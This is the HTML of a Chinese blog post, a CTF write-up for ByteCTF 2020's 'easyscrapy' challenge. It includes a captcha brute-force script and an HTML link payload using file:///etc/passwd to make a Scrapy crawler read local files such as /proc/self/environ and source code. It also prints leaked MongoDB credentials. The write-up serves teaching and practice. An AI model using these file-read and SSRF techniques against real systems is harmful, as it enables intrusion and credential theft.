@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#@byc_404'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>ByteCTF2020-easyscrapy - byc_404&#39;s blog</title>
+  
+    <meta name="keywords" content="CTF,WEB,wp,redis">
+  
+  
+    <meta name="description" content=" 这次ByteCTF的web题难度属实离谱。好几道题几乎都无法下手。自己第一天主要是看了easyscrapy以及配了beaker的环境(结果根本操作不起来，于是放弃了……)第二天上午在配scrapy的环境，一直到下午才出思路,基本上给我几小时就能出了。然而因为要赶飞机结果没时间做了……晚上到了后总归是把题目做出来...">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+  <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div class="cover-wrapper">
+    
+      <cover class='cover post half'>
+        <div class='cover-body'>
+  <div class='a'>
+    
+    
+      <p class="title">byc_404's blog</p>
+    
+    
+      <p class="subtitle">Do not go gentle into that good night</p>
+    
+  </div>
+  <div class='b'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="" />
+          <i class="icon fas fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <ul class='cover-list-h'>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+      </cover>
+    
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+          
+            IGNITE <b><sup style='color:#3AA757'>@byc_404</sup></b>
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+  </div>
+
+
+  <div class="l_body">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/10/26/ByteCTF2020-easyscrapy/">
+      ByteCTF2020-easyscrapy
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://www.bycsec.top" rel="nofollow">
+    <img src="/assests/favicon.ico">
+    <p>byc_404</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Oct 26, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <p> 这次ByteCTF的web题难度属实离谱。好几道题几乎都无法下手。自己第一天主要是看了easyscrapy以及配了beaker的环境(结果根本操作不起来，于是放弃了……)第二天上午在配scrapy的环境，一直到下午才出思路,基本上给我几小时就能出了。然而因为要赶飞机结果没时间做了……晚上到了后总归是把题目做出来了。只能说有点可惜，不然可以为小绿草拿个三/四血的。</p>
+<p>这里我分享下自己一路下来的主要思路吧。希望能对他人有所帮助。另外写文章时环境已经关了，没啥图，将就着看吧</p>
+<a id="more"></a>
+
+<h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>首先题目本身给出了一个功能可以让我们输入url以及一个验证码，但是注意到这里cookie是flask的session,存储的内容与每次页面回显的验证码一致。所以首先我们可以找到减少后面的工作的方法,就是带上固定的cookie写脚本进行存储url的操作。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://39.102.69.151:30010/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">'session'</span>:<span class="string">'eyJjb2RlIjoiZTFiMmQ5IiwidXNlciI6IjVhNTkwZjVhLTE2ZjgtMTFlYi1hYThhLTAyNDJhYzE0MDAwNiJ9.X5XSBA.z2Nn4le-aOsM8jg82j7gMzfzhSc'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(code)</span>:</span></span><br><span class="line">    a = string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> a:</span><br><span class="line">                        p = i + j + k + m + n</span><br><span class="line">                        s = hashlib.md5(p.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                        <span class="keyword">if</span> s == code:</span><br><span class="line">                            print(p)</span><br><span class="line">                            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">()</span>:</span></span><br><span class="line">    r=requests.get(URL,cookies=cookies)</span><br><span class="line">    varify=re.findall(<span class="string">r'&lt;span&gt;substr\(md5\(\$str\), 0, 6\) === (.*)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> varify</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(url,code)</span>:</span></span><br><span class="line">    r=requests.post(url=URL+<span class="string">'push'</span>,cookies=cookies,data=&#123;<span class="string">'url'</span>:url,<span class="string">'code'</span>:code&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="comment">#code=brute(send())</span></span><br><span class="line"><span class="comment">#print(code)</span></span><br><span class="line">push(<span class="string">'http://120.27.246.202/'</span>,code)</span><br><span class="line"><span class="comment">#push('http://127.0.0.1:','0AUDp')</span></span><br></pre></td></tr></table></figure>
+<p>爆破一次后就可继续用了。</p>
+<p>之后发现，当输入完url存储后，urllist中会存在我们刚刚输入的url。之后点击则会前往<code>/result?url=xxxx</code>.似乎是一个ssrf的点。</p>
+<p>第一天上午的话，感觉爬什么都爬不到。但是当时往自己的vps上打的时候倒是有意外的发现<br>当时的笔记:<br><img src="https://i.imgur.com/hiUBWKq.png" alt></p>
+<p>意外发现了scrapy_redis以及pycurl。正如上面所说，url数据似乎是被存到redis然后被爬虫给爬了。而后面<code>/result?url</code>则是动用了另一种功能进行pycurl的请求。</p>
+<p>这里pycurl无疑是值得注意的,因为pycurl本质上似乎是跟调用<code>curl</code>一样的。那么可以使用<code>gopher</code>协议。</p>
+<p>这样一来当然就想探测redis了。不过经过尝试,会发现没有任何回显。关于版本等等信息也是一无所知。</p>
+<p>此时再次实验打自己，我发现当更换自己服务端的内容时，<code>/result</code>所显示的页面并没改变。</p>
+<p>联系到上面的<code>scrapy_redis</code>,我们不难推测,<code>scrapy</code>会爬我们存储的那个url,并将当时的内容缓存(后面会发现是mongodb)。所以这就导致,反复用result页面请求url并不会改变回显内容。充其量调用了pycurl请求而已。</p>
+<p>那么，到此我们对整个服务的构架有了大概的思路</p>
+<ol>
+<li>存在爬虫bot</li>
+<li>存在redis</li>
+<li>可能存在某数据库</li>
+<li>pycurl 是web服务请求，scrapy_redis是爬虫bot请求   </li>
+</ol>
+<p>但是这些信息非常局限。首先只有存进redis的数据才会被爬虫请求,这里python没有crlf必然打不了redis.而pycurl虽然可以用gopher那一套打,但是内网信息未知,且没有回显。</p>
+<p>这时我开始尝试性爬一些网站。讽刺的是baidu能爬它自己的bytedance爬不了2333. 然后爬本机127.0.0.1也完全没有内容(因为bot开了端口的服务实际上只有一个6023的telnet,打了会提前报错,一样无回显)</p>
+<p>那么,不妨尝试下打它的公网ip？这时我发现一个奇怪的现象。<br>当我输入它的公网ip存进redis后，它除了本身，还读取了<code>/list</code>的页面。</p>
+<p>那么这是为什么呢？我简单看了下页面。发现里面存在<code>&lt;a href=&quot;/list&quot;&gt;&lt;/&gt;</code><br>看来，爬虫端是会根据<code>&lt;a href=&quot;xxx&quot;&gt;&lt;/a&gt;</code>进行进一步爬取.经过经典的实验打自己，发现的确它会顺着这个href进行请求。</p>
+<p>此时已经知道href有猫腻了。然后出题人已经放出了第一个hint。就是尝试读源码。</p>
+<p>那么我们不妨尝试下，顺着这个href+file协议进行源码的阅读？</p>
+<h2 id="leak-source-code"><a href="#leak-source-code" class="headerlink" title="leak source code"></a>leak source code</h2><p>在自己的服务器上存储</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着上面的脚本跑一遍。一把梭解决问题。<br>再次访问<code>/result</code>。发现读到了<code>/etc/passwd</code></p>
+<p>既然如此，我们依次读下其他内容<br><code>/proc/self/cmdline</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash run.sh</span><br></pre></td></tr></table></figure>
+<p><code>/proc/self/environ</code><br>得知当前PWD是<code>/code</code></p>
+<p>读<code>/code/run.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">scrapy crawl byte</span><br></pre></td></tr></table></figure>
+<p>使用的是scrapy框架进行爬取。</p>
+<p>此时开始自己盲目的读结果发现啥都没读到,想了想发现这个爬虫bot可能只有这么一个命令在运行。那么我应该去查找scrapy的文档<br>我们找到scrapy官方文档</p>
+<p><img src="https://i.imgur.com/5ZlDlDG.png" alt></p>
+<p>显然我们只需读取<code>scrapy.cfg</code>就能拿到scrapy项目名并读取到下面所有文件。不过spider的名字似乎是自定义的</p>
+<p><img src="https://i.imgur.com/uXo8IiC.png" alt><br><img src="https://i.imgur.com/zVeZub0.png" alt><br>前面命令行执行的是<code>scrapy crawl byte</code>那么可以确认spider的name是byte.文件名也可能是byte.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure>
+
+<p>其他内容也都一并读取。<br>完整的文件我会放自己github上。包括redis跟mongodb的docker</p>
+<p>此时我通过pipelines.py与settings.py分别得到了mongodb与redis的配置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">'result'</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">'result'</span></span><br><span class="line">        MONGODB_USER = <span class="string">'N0rth3'</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">'E7B70D0456DAD39E22735E0AC64A69AD'</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">"%s:%d"</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">'bytectf'</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">'bytectf.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'bytectf.spiders'</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">'scrapy_redis'</span></span><br><span class="line">SCHEDULER = <span class="string">"scrapy_redis.scheduler.Scheduler"</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">"scrapy_redis.dupefilter.RFPDupeFilter"</span></span><br><span class="line">REDIS_HOST = <span class="string">'172.20.0.7'</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">'bytectf.pipelines.BytectfPipeline'</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以及主要的爬虫逻辑。知道了文件读取的漏洞所在</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span><span class="params">(RedisSpider)</span>:</span></span><br><span class="line">    name = <span class="string">'byte'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">'byte_start'</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">'//a/@href'</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">'/'</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r'://'</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">'item'</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span><span class="params">(self,response)</span>:</span></span><br><span class="line">        item = response.meta[<span class="string">'item'</span>]</span><br><span class="line">        item[<span class="string">'byte_url'</span>] = response.request.url</span><br><span class="line">        item[<span class="string">'byte_text'</span>] = base64.b64encode((response.text).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>
+
+<p>可是这有什么用呢……我们一样不知道flag在哪。目前看来,如果flag在bot机器上,那么只有可能会是打redis。并且按照我自己的少数经验，一般是搭配pickle反序列化rce才有可能。但是这里并没有明显的pickle反序列化代码。</p>
+<p>此时陷入僵局，只有本地调试一下看看有没有意外发生了。</p>
+<h2 id="Run-it-locally"><a href="#Run-it-locally" class="headerlink" title="Run it locally"></a>Run it locally</h2><p>这道题最重要的一点恐怕就是本地跑了。毕竟此时我们对环境一无所知,我唯一能想到的getshell方法也只有pickle反序列化了。那么试试本地，看看有没有键存了pickle序列化后的数据？这样一来必然有某个地方存在反序列化。</p>
+<p>经过一番折腾后。我简单写了个起mongodb的docker.因为redis跟爬虫本地起比较轻松,我又不想改代码。<br>(后面比赛结束时写了个完整版的,直接起应该跟线上的bot+redis+mongo环境基本一致了)<br>docker-compose.yml</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">    <span class="attr">mongodb:</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">mongo:4.2</span></span><br><span class="line">      <span class="attr">container_name:</span> <span class="string">py_db</span></span><br><span class="line">      <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">      <span class="attr">environment:</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="string">root</span> </span><br><span class="line">        <span class="attr">MONGO_INITDB_DATABASE:</span> <span class="string">result</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">./mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro</span></span><br></pre></td></tr></table></figure>
+<p>同目录下mongo-init.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data=&#123;<span class="string">"test"</span>:<span class="string">"123"</span>&#125;<span class="comment">//just for test</span></span><br><span class="line">db.result.drop();</span><br><span class="line">db.result.insert(data);</span><br><span class="line">db.createUser(&#123;</span><br><span class="line">    user: <span class="string">"N0rth3"</span>,</span><br><span class="line">    pwd:  <span class="string">"E7B70D0456DAD39E22735E0AC64A69AD"</span>,</span><br><span class="line">    roles: [ &#123; <span class="attr">role</span>: <span class="string">"readWrite"</span>, <span class="attr">db</span>: <span class="string">"result"</span>, <span class="attr">collection</span>:<span class="string">"result"</span> &#125;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>简单改下爬虫的redis/mongodb ip ,就能开跑了</p>
+<p><img src="https://i.imgur.com/znmnKI4.png" alt></p>
+<p>然后此时我发现一点动静的都没有。感觉非常奇怪。倒是看到scrapy它在准备读<code>byte:start_urls</code></p>
+<p>既然如此那<code>set xx xxx</code>试试看好了。结果突然发现爬虫直接异常退出？</p>
+<p>看了下报错。似乎是在执行redis的LPOP操作报错的。那可能是数据类型的问题了。找了下一篇文章发现了原因。</p>
+<p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571" target="_blank" rel="noopener">https://blog.csdn.net/zwq912318834/article/details/78854571</a><br>它爬虫的逻辑跟我们的基本一致。属于分布式爬虫。即等待redis中出现redis_key再进行爬取。<br>而这里因为不是简单的从字符串进行读取，而是从一个队列里读一个元素。那么自然不会读到内容了。</p>
+<p>期间,转战虚拟机起服务。这一次我们用脚本写入数据。其实就是执行lpush而已。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line">redis_Host = <span class="string">"127.0.0.1"</span></span><br><span class="line">redis_key = <span class="string">'byte:start_urls'</span></span><br><span class="line">rediscli = redis.Redis(host = redis_Host, port = <span class="number">6379</span>, db = <span class="string">"0"</span>)</span><br><span class="line">rediscli.lpush(redis_key, <span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure>
+<p>这时就可以成功写入,爬取数据，并将数据存进mongodb。<br>这里我再尝试打一遍redis跟mongodb。发现跟服务端远程是一致的。打redis会提前报错终止，打mongodb会有回显<br><img src="https://i.imgur.com/t0i6Z1n.png" alt></p>
+<p><img src="https://i.imgur.com/0Py191w.png" alt></p>
